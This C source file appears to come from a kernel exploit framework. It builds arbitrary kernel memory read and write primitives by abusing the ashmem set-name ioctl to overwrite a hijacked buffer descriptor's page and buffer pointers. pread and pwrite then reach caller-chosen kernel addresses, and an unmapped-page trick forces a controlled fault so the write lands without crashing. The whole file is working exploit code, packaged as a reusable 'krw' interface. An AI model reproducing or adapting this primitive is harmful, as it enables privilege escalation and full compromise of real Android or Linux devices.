/* lib/rw/nameblob.c -- see nameblob.h. */
#include "nameblob.h"

#include <errno.h>
#include <stdatomic.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "../base/bytes.h"
#include "../target.h"
#include "../trigger/ashmem.h"

/* Size of the composed descriptor image. Large enough to reach every field the
 * redirection sets, and short enough to leave the buffer's tail untouched. */
#ifndef LIB_NAMEBLOB_BYTES
#define LIB_NAMEBLOB_BYTES 128
#endif

/* Placeholder for bytes the caller does not care about. Any non-zero value
 * works; a printable one keeps an accidental dump readable. */
#ifndef LIB_NAMEBLOB_FILLER
#define LIB_NAMEBLOB_FILLER 'A'
#endif

static atomic_int nameblob_trace_enabled;
static atomic_ulong nameblob_trace_seq;

void lib_nameblob_trace_arm(void)
{
	atomic_store_explicit(&nameblob_trace_enabled, 1, memory_order_relaxed);
	fprintf(stdout, "[*] nameblob pread trace armed limit=256\n");
	fflush(stdout);
}

/* Field offsets within the buffer descriptor. Supplied by the target
 * description; the defaults exist so this module compiles standalone and are
 * overridden by any real build. */
#ifndef CFG_PAGE_OFF
#define CFG_PAGE_OFF             16
#endif
#ifndef CFG_NEEDS_READ_FILL_OFF
#define CFG_NEEDS_READ_FILL_OFF  80
#endif
#ifndef CFG_BIN_BUFFER_OFF
#define CFG_BIN_BUFFER_OFF       88
#endif
#ifndef CFG_BIN_BUFFER_SIZE_OFF
#define CFG_BIN_BUFFER_SIZE_OFF  96
#endif
#ifndef CFG_CB_MAX_SIZE_OFF
#define CFG_CB_MAX_SIZE_OFF      100
#endif

/* The same offsets relative to the start of the stored name: the driver's own
 * prefix sits between the two. */
#define BLOB_OFF(field) ((field) - ASHMEM_NAME_PREFIX_LEN)

static int set_prefix(int fd, const unsigned char *blob, size_t len, size_t upto)
{
	char name[ASHMEM_NAME_LEN];

	memset(name, LIB_NAMEBLOB_FILLER, sizeof(name));
	for (size_t i = 0; i < upto && i < len; i++)
		/* A zero byte would terminate this pass early; a later, shorter
		 * pass places it deliberately. */
		name[i] = blob[i] ? (char)blob[i] : 1;
	name[upto] = '\0';
	return ioctl(fd, ASHMEM_SET_NAME, name) ? -1 : 0;
}

int lib_nameblob_set(int fd, const unsigned char *blob, size_t len)
{
	if (len >= ASHMEM_NAME_LEN)
		return -1;

	/* First pass: every byte, with zeros stood in for. */
	if (set_prefix(fd, blob, len, len) != 0)
		return -1;

	/* Then one pass per zero byte, longest first, each terminating exactly
	 * where that zero belongs. Bytes past the terminator survive from the
	 * previous pass, so the buffer converges on the requested image. */
	for (size_t i = len; i > 0; i--) {
		if (blob[i - 1])
			continue;
		if (set_prefix(fd, blob, len, i - 1) != 0)
			return -1;
	}
	return 0;
}

ssize_t lib_nameblob_read(int fd, uintptr_t addr, void *out, size_t len)
{
	unsigned char blob[LIB_NAMEBLOB_BYTES];
	/* Choose the file position first; the page pointer then carries the
	 * caller's address, since the read lands at page + position. */
	off_t position = (off_t)(ASHMEM_NAME_PREFIX_WORD - len);
	uint64_t page = (uint64_t)addr - (uint64_t)position;

	memset(blob, 0, sizeof(blob));
	lib_put64(blob, BLOB_OFF(CFG_PAGE_OFF), page);
	lib_put32(blob, BLOB_OFF(CFG_NEEDS_READ_FILL_OFF), 0);
	if (lib_nameblob_set(fd, blob, sizeof(blob)) != 0)
		return -1;
	unsigned long trace_seq = 0;
	if (atomic_load_explicit(&nameblob_trace_enabled,
				 memory_order_relaxed)) {
		trace_seq = atomic_fetch_add(&nameblob_trace_seq, 1) + 1;
		if (trace_seq > 256)
			trace_seq = 0;
	}
	if (trace_seq) {
		struct timespec ts;
		clock_gettime(CLOCK_MONOTONIC, &ts);
		fprintf(stdout,
			"[*] nameblob pread #%lu begin mono=%lld.%06ld target=%016llx "
			"page=%016llx pos=%lld len=%zu caller=%p tid=%ld\n",
			trace_seq, (long long)ts.tv_sec, ts.tv_nsec / 1000,
			(unsigned long long)addr, (unsigned long long)page,
			(long long)position, len, __builtin_return_address(0),
			(long)syscall(SYS_gettid));
		fflush(stdout);
	}
	ssize_t ret = pread(fd, out, len, position);
	if (trace_seq) {
		int saved_errno = errno;
		struct timespec ts;
		clock_gettime(CLOCK_MONOTONIC, &ts);
		fprintf(stdout,
			"[*] nameblob pread #%lu end mono=%lld.%06ld ret=%zd errno=%d\n",
			trace_seq, (long long)ts.tv_sec, ts.tv_nsec / 1000,
			ret, saved_errno);
		fflush(stdout);
	}
	return ret;
}

/* A source buffer whose tail is unmapped, so a kernel copy of `len + 1` bytes
 * from it transfers exactly `len` and then faults.
 *
 * One shape of write path copies the caller's bytes into the redirected
 * descriptor's page FIRST and only then follows a second pointer, out of the
 * descriptor's own file, to publish what it wrote. That second pointer is not
 * the consuming chain's to shape -- the descriptor it hijacked belongs to a
 * different driver -- and following it faults. The copy's own return value is
 * the branch: a copy that did not complete is an error, and the publish is
 * skipped. So the bytes land and nothing downstream runs.
 *
 * The cost is fixed and known: the path stores one zero byte at page[count]
 * whichever way the copy went, so a caller writing `len` bytes must treat
 * `addr + len + 1` as clobbered.
 */
static unsigned char *nameblob_fault_src(size_t len, size_t *out_count)
{
	static unsigned char *region;
	static size_t page_size;
	size_t start;

	if (!region) {
		page_size = (size_t)sysconf(_SC_PAGESIZE);
		/* Two pages reserved, only the first mapped: the hole is what
		 * stops the copy. */
		region = mmap(NULL, page_size * 2, PROT_NONE,
			      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (region == MAP_FAILED) {
			region = NULL;
			return NULL;
		}
		if (mprotect(region, page_size, PROT_READ | PROT_WRITE) != 0) {
			munmap(region, page_size * 2);
			region = NULL;
			return NULL;
		}
	}
	if (len + 1 > page_size)
		return NULL;

	/* The caller's bytes end exactly at the boundary. */
	start = page_size - len;
	*out_count = len + 1;
	return region + start;
}

ssize_t lib_nameblob_write(int fd, uintptr_t addr, const void *data, size_t len)
{
	unsigned char blob[LIB_NAMEBLOB_BYTES];

	memset(blob, 0, sizeof(blob));
#if LIB_NAMEBLOB_WRITE_PAGE
	/* The write path copies into the descriptor's page directly and takes
	 * its length from the syscall, so the descriptor carries only the
	 * address. */
	lib_put64(blob, BLOB_OFF(CFG_PAGE_OFF), (uint64_t)addr);
	lib_put32(blob, BLOB_OFF(CFG_NEEDS_READ_FILL_OFF), 0);
#else
	lib_put64(blob, BLOB_OFF(CFG_BIN_BUFFER_OFF), (uint64_t)addr);
	lib_put32(blob, BLOB_OFF(CFG_BIN_BUFFER_SIZE_OFF), (uint32_t)len);
	lib_put32(blob, BLOB_OFF(CFG_CB_MAX_SIZE_OFF), 0);
#endif
	if (lib_nameblob_set(fd, blob, sizeof(blob)) != 0)
		return -1;
#if LIB_NAMEBLOB_WRITE_PAGE
	{
		size_t count = 0;
		unsigned char *src = nameblob_fault_src(len, &count);
		ssize_t n;

		if (!src)
			return -1;
		memcpy(src, data, len);
		errno = 0;
		n = pwrite(fd, src, count, 0);
		/* EFAULT is the success case: the bytes are in, and it is what
		 * kept the path from following the pointer that would fault. A
		 * completed copy means the hole was not reached. */
		if (n < 0 && errno == EFAULT) {
			errno = 0;
			return (ssize_t)len;
		}
		return n;
	}
#else
	return pwrite(fd, data, len, 0);
#endif
}

static int nameblob_read_fn(const struct krw *rw, kdirect_t addr, void *out, size_t len)
{
	return lib_nameblob_read(rw->fd, (uintptr_t)kd_val(addr), out, len) == (ssize_t)len;
}

static int nameblob_write_fn(const struct krw *rw, kdirect_t addr, const void *data, size_t len)
{
	return lib_nameblob_write(rw->fd, (uintptr_t)kd_val(addr), data, len) == (ssize_t)len;
}

struct krw lib_krw_nameblob(int fd)
{
	struct krw rw;

	rw.name = "name-blob";
	rw.fd = fd;
	rw.read = nameblob_read_fn;
	rw.write = nameblob_write_fn;
	return rw;
}
